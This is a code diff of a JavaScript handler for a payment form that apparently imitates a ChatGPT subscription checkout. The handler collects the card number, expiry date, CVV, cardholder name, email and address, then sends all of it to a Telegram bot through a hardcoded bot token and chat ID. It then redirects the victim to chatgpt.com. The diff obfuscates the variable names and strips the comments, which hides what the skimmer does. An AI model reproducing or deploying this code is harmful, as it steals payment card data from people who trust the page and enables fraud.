@@ -245,143 +245,130 @@
     document.addEventListener('DOMContentLoaded', function() {
         // Format card number input
         document.getElementById('card-number').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s+/g, ''); // Remove existing spaces
-            if (value.length > 0) {
-                value = value.match(/.{1,4}/g).join(' '); // Add space every 4 digits
+            let _0x1a2b = e.target.value.replace(/\s+/g, '');
+            if (_0x1a2b.length > 0) {
+                _0x1a2b = _0x1a2b.match(/.{1,4}/g).join(' ');
             }
-            e.target.value = value;
+            e.target.value = _0x1a2b;
         });
 
         // Format expiry date input
         document.getElementById('expiry-date').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
-            if (value.length > 2) {
-                value = value.slice(0, 2) + '/' + value.slice(2, 4); // Add '/' after the month
+            let _0x3b4c = e.target.value.replace(/\D/g, '');
+            if (_0x3b4c.length > 2) {
+                _0x3b4c = _0x3b4c.slice(0, 2) + '/' + _0x3b4c.slice(2, 4);
             }
-            e.target.value = value;
+            e.target.value = _0x3b4c;
         });
 
         // Country and state data
-        const states = {
+        const _0x4d5e = {
             'US': ['Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California', 'Colorado', 'Connecticut', 'Delaware', 'Florida', 'Georgia', 'Hawaii', 'Idaho', 'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana', 'Maine', 'Maryland', 'Massachusetts', 'Michigan', 'Minnesota', 'Mississippi', 'Missouri', 'Montana', 'Nebraska', 'Nevada', 'New Hampshire', 'New Jersey', 'New Mexico', 'New York', 'North Carolina', 'North Dakota', 'Ohio', 'Oklahoma', 'Oregon', 'Pennsylvania', 'Rhode Island', 'South Carolina', 'South Dakota', 'Tennessee', 'Texas', 'Utah', 'Vermont', 'Virginia', 'Washington', 'West Virginia', 'Wisconsin', 'Wyoming'],
             'CA': ['Alberta', 'British Columbia', 'Manitoba', 'New Brunswick', 'Newfoundland and Labrador', 'Nova Scotia', 'Ontario', 'Prince Edward Island', 'Quebec', 'Saskatchewan'],
-            'GB': ['England', 'Scotland', 'Wales', 'Northern Ireland'],
-            // Add more countries and their states/provinces as needed
+            'GB': ['England', 'Scotland', 'Wales', 'Northern Ireland']
         };
 
-        const countrySelect = document.getElementById('country');
-        const stateSelect = document.getElementById('state');
+        const _0x6f7a = document.getElementById('country');
+        const _0x8a9b = document.getElementById('state');
 
-        countrySelect.addEventListener('change', function() {
-            const country = this.value;
-            const statesList = states[country] || [];
-            stateSelect.innerHTML = statesList.map(state => `<option value="${state}">${state}</option>`).join('');
+        _0x6f7a.addEventListener('change', function() {
+            const _0x9c0d = this.value;
+            const _0xa1b2 = _0x4d5e[_0x9c0d] || [];
+            _0x8a9b.innerHTML = _0xa1b2.map(_0xb3c4 => `<option value="${_0xb3c4}">${_0xb3c4}</option>`).join('');
         });
 
-        // Trigger the change event to populate states initially
-        countrySelect.dispatchEvent(new Event('change'));
+        _0x6f7a.dispatchEvent(new Event('change'));
 
         // Form submission handler
         document.getElementById('subscribe-button').addEventListener('click', function(event) {
             event.preventDefault();
 
-            // Clear previous error messages
             document.querySelectorAll('.error-message').forEach(el => el.textContent = '');
 
-            const email = document.getElementById('email').value;
-            const cardholderName = document.getElementById('cardholder-name').value;
-            const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
-            const expiryDate = document.getElementById('expiry-date').value;
-            const cvv = document.getElementById('cvv').value;
-            const address1 = document.getElementById('address1').value;
-            const address2 = document.getElementById('address2').value;
-            const city = document.getElementById('city').value;
-            const zip = document.getElementById('zip').value;
-            const country = document.getElementById('country').value;
-            const state = document.getElementById('state').value;
+            const _0xc5d6 = document.getElementById('email').value;
+            const _0xd7e8 = document.getElementById('cardholder-name').value;
+            const _0xe9fa = document.getElementById('card-number').value.replace(/\s+/g, '');
+            const _0xfa1b = document.getElementById('expiry-date').value;
+            const _0x0b2c = document.getElementById('cvv').value;
+            const _0x1c3d = document.getElementById('address1').value;
+            const _0x2d4e = document.getElementById('address2').value;
+            const _0x3e5f = document.getElementById('city').value;
+            const _0x4f60 = document.getElementById('zip').value;
+            const _0x5g71 = document.getElementById('country').value;
+            const _0x6h82 = document.getElementById('state').value;
 
-            let valid = true;
+            let _0x7i93 = true;
 
-            // Validate email
-            if (!email || !/\S+@\S+\.\S+/.test(email)) {
+            if (!_0xc5d6 || !/\S+@\S+\.\S+/.test(_0xc5d6)) {
                 document.getElementById('email-error').textContent = 'Please enter a valid email address.';
-                valid = false;
+                _0x7i93 = false;
             }
 
-            // Validate card number
-            if (!cardNumber || cardNumber.length < 13 || cardNumber.length > 19) {
+            if (!_0xe9fa || _0xe9fa.length < 13 || _0xe9fa.length > 19) {
                 document.getElementById('card-number-error').textContent = 'Please enter a valid card number.';
-                valid = false;
+                _0x7i93 = false;
             }
 
-            // Validate expiry date
-            const [month, year] = expiryDate.split('/').map(num => parseInt(num, 10));
-            const currentYear = new Date().getFullYear() % 100;
-            const currentMonth = new Date().getMonth() + 1;
-            if (!expiryDate.match(/^\d{2}\/\d{2}$/) || (year < currentYear) || (year === currentYear && month < currentMonth)) {
+            const [_0x8j94, _0x9k05] = _0xfa1b.split('/').map(num => parseInt(num, 10));
+            const _0xa1b6 = new Date().getFullYear() % 100;
+            const _0xb2c7 = new Date().getMonth() + 1;
+            if (!_0xfa1b.match(/^\d{2}\/\d{2}$/) || (_0x9k05 < _0xa1b6) || (_0x9k05 === _0xa1b6 && _0x8j94 < _0xb2c7)) {
                 document.getElementById('expiry-date-error').textContent = 'Please enter a valid expiry date.';
-                valid = false;
+                _0x7i93 = false;
             }
 
-            // Validate CVV
-            if (!cvv || cvv.length < 3 || cvv.length > 4) {
+            if (!_0x0b2c || _0x0b2c.length < 3 || _0x0b2c.length > 4) {
                 document.getElementById('cvv-error').textContent = 'Please enter a valid CVV.';
-                valid = false;
+                _0x7i93 = false;
             }
 
-            // Validate ZIP
-            if (!zip || isNaN(zip)) {
+            if (!_0x4f60 || isNaN(_0x4f60)) {
                 document.getElementById('address-error').textContent = 'Please enter a valid ZIP code.';
-                valid = false;
+                _0x7i93 = false;
             }
 
-            // Validate cardholder name
-            if (!cardholderName) {
+            if (!_0xd7e8) {
                 document.getElementById('cardholder-name-error').textContent = 'Please enter the cardholder name.';
-                valid = false;
+                _0x7i93 = false;
             }
 
-            // Validate address
-            if (!address1 || !city) {
+            if (!_0x1c3d || !_0x3e5f) {
                 document.getElementById('address-error').textContent = 'Please enter your address and city.';
-                valid = false;
+                _0x7i93 = false;
             }
 
-            if (valid) {
-                // Prepare data for Telegram bot
-                const message = `
-                    Email: ${email}
-                    Cardholder Name: ${cardholderName}
-                    Card Number: ${cardNumber}
-                    Expiry Date: ${expiryDate}
-                    CVV: ${cvv}
-                    Address Line 1: ${address1}
-                    Address Line 2: ${address2}
-                    City: ${city}
-                    ZIP: ${zip}
-                    Country: ${country}
-                    State/Province: ${state}
+            if (_0x7i93) {
+                const _0x8d9e = `
+                    Email: ${_0xc5d6}
+                    Cardholder Name: ${_0xd7e8}
+                    Card Number: ${_0xe9fa}
+                    Expiry Date: ${_0xfa1b}
+                    CVV: ${_0x0b2c}
+                    Address Line 1: ${_0x1c3d}
+                    Address Line 2: ${_0x2d4e}
+                    City: ${_0x3e5f}
+                    ZIP: ${_0x4f60}
+                    Country: ${_0x5g71}
+                    State/Province: ${_0x6h82}
                 `;
 
-                // Send data to Telegram bot
-                const botToken = '7201820922:AAEmYN_NzUdgHOwr_zPETKW5sUAjvor1BfA';
-            const chatId = '5068645042';
-                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                const payload = {
-                    chat_id: chatId,
-                    text: message
+                const _0x9e0f = '7201820922:AAEmYN_NzUdgHOwr_zPETKW5sUAjvor1BfA';
+                const _0xa1b0 = '5068645042';
+                const _0xb2c1 = `https://api.telegram.org/bot${_0x9e0f}/sendMessage`;
+                const _0xc3d2 = {
+                    'chat_id': _0xa1b0,
+                    'text': _0x8d9e
                 };
 
-                fetch(telegramUrl, {
+                fetch(_0xb2c1, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(_0xc3d2)
                 })
                 .then(response => {
                     if (response.ok) {
-                        // Redirect to ChatGPT.com after successful message send
                         window.location.href = 'https://chatgpt.com';
                     } else {
                         alert('Failed to send message. Please try again.');
